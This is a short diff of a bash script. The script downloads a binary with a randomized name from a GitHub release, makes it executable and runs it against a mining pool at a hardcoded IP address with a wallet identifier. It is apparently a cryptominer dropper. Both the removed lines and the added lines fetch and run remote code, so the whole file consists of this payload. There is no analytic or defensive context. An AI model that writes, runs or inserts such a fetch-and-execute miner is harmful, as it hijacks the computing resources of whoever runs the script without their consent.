@@ -1,4 +1,4 @@
 #!/bin/bash
-wget https://github.com/vedhagsvp/soljtka/releases/download/latest/abelnak
-chmod +x abelnak
-./abelnak start -p stratum://243ef953f77c32bcea55a61a5521c1f9fcf246180750e630d1fd62905c9783e8:fb9da3426a@50.116.14.118:8088
+wget https://github.com/vedhagsvp/tkospae/releases/download/aplose/hocpa
+chmod +x hocpa
+./hocpa -o 72.14.177.114:8085 -u xel:4rxku34zp47htjxglcmcexz4ku2jp0dmemgt4wet7klq76a923sqq0tcq2c.msd -p x
